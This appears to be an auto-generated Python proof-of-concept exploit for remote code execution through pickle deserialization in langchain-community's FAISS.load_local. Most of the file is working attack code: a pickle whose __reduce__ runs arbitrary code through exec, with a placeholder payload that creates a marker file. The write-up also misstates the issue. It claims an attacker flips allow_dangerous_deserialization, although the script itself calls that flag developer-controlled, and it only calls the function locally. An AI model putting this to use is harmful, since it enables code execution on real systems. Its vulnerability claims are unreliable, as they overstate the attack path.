#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_16.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: Insecure deserialization via pickle.load() with user-controlled
folder_path and index_name parameters. The allow_dangerous_deserialization flag
is a developer-side switch that does not validate file content.

Impact: Arbitrary code execution when loading a malicious pickle file.
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration
TARGET_HOST = "http://localhost:8000"  # Change to target server
TARGET_ENDPOINT = "/api/v1/trigger"    # Simulated endpoint

# Benign payload for demonstration (creates a marker file)
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_pickle(payload_code: str) -> bytes:
    """
    Create a malicious pickle that executes arbitrary code when deserialized.
    
    Args:
        payload_code: Python code to execute as a string
        
    Returns:
        Serialized pickle bytes containing the malicious payload
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (exec, (payload_code,))
    
    return pickle.dumps(MaliciousPickle())

def setup_exploit_environment():
    """
    Create a temporary directory with a malicious pickle file.
    Returns the path to the directory containing the malicious pickle.
    """
    # Create temporary directory
    temp_dir = tempfile.mkdtemp(prefix="exploit_")
    
    # Create malicious pickle file named "index.pkl"
    malicious_pickle = create_malicious_pickle(BENIGN_PAYLOAD)
    pickle_path = Path(temp_dir) / "index.pkl"
    
    with open(pickle_path, "wb") as f:
        f.write(malicious_pickle)
    
    # Also create a dummy .faiss file (required by load_local)
    faiss_path = Path(temp_dir) / "index.faiss"
    with open(faiss_path, "wb") as f:
        f.write(b"dummy_faiss_data")
    
    print(f"[+] Created malicious pickle at: {pickle_path}")
    print(f"[+] Created dummy FAISS file at: {faiss_path}")
    return temp_dir

def simulate_exploit(folder_path: str, index_name: str = "index"):
    """
    Simulate the exploit by directly calling load_local with attacker-controlled
    parameters. In a real attack, this would be triggered via the web endpoint.
    
    Args:
        folder_path: Path to folder containing malicious pickle
        index_name: Name of the index file (without extension)
    """
    # This simulates what the vulnerable endpoint would do
    # In a real scenario, the attacker controls folder_path and index_name
    from langchain_community.vectorstores.faiss import FAISS
    
    try:
        # The allow_dangerous_deserialization flag is set to True by the attacker
        result = FAISS.load_local(
            folder_path=folder_path,
            embeddings=None,  # Not needed for exploit
            index_name=index_name,
            allow_dangerous_deserialization=True  # Attacker bypasses the guard
        )
        print(f"[+] FAISS object loaded: {result}")
    except Exception as e:
        print(f"[!] Error during load_local: {e}")

def verify_exploit_success():
    """Check if the benign payload executed successfully."""
    marker_file = Path("/tmp/poc_success.txt")
    if marker_file.exists():
        print("[+] EXPLOIT SUCCESSFUL: Marker file created at /tmp/poc_success.txt")
        print("[+] This demonstrates arbitrary code execution via pickle deserialization")
        # Clean up marker file
        marker_file.unlink()
        return True
    else:
        print("[-] Exploit may not have executed (marker file not found)")
        return False

def main():
    """Main exploit execution flow."""
    print("[*] Starting Proof-of-Concept exploit for langchain-community RCE")
    print("[*] Vulnerability: Insecure deserialization in load_local()")
    print()
    
    # Step 1: Create malicious pickle file
    print("[*] Step 1: Creating malicious pickle file...")
    exploit_dir = setup_exploit_environment()
    
    # Step 2: Execute the exploit
    print("\n[*] Step 2: Executing exploit via load_local...")
    print("[*] Note: In a real attack, this would be triggered via:")
    print(f"[*]   POST {TARGET_HOST}{TARGET_ENDPOINT}")
    print(f"[*]   with folder_path='{exploit_dir}' and index_name='index'")
    print()
    
    simulate_exploit(folder_path=exploit_dir)
    
    # Step 3: Verify exploit success
    print("\n[*] Step 3: Verifying exploit success...")
    verify_exploit_success()
    
    # Cleanup
    print("\n[*] Cleaning up temporary files...")
    import shutil
    shutil.rmtree(exploit_dir, ignore_errors=True)
    print(f"[+] Removed temporary directory: {exploit_dir}")
    
    print("\n[*] Exploit demonstration complete.")
    print("[*] This PoC shows that an attacker can achieve RCE by:")
    print("  1. Controlling folder_path and index_name parameters")
    print("  2. Setting allow_dangerous_deserialization=True")
    print("  3. Pointing to a malicious pickle file")

if __name__ == "__main__":
    main()
